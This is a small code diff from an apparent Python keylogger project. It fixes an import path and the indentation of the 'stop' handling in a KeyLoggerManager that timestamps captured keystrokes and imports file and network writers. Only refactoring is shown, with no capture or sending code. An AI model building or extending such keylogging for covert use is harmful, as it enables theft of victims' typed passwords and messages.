@@ -1,4 +1,4 @@
-from encryption.encryption import Encryption
+from encryptionDecryption.encryption import Encryption
 from keylogger.keylogger_service import KeyloggerService
 from writer.FileWriter import FileWriter
 from writer.NetWorkWriter import NetWorkWriter
@@ -36,8 +36,8 @@ class KeyLoggerManager:
             logged_keys = "".join(self.keylogger.get_logged_keys())
             if logged_keys:
                 if "stop" in logged_keys:
-                        self.keylogger.stop_logging()
-                        self.flag = False
+                    self.keylogger.stop_logging()
+                    self.flag = False
                     logged_keys = logged_keys.split('stop')[0] + 'stop'
                 logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                 try:
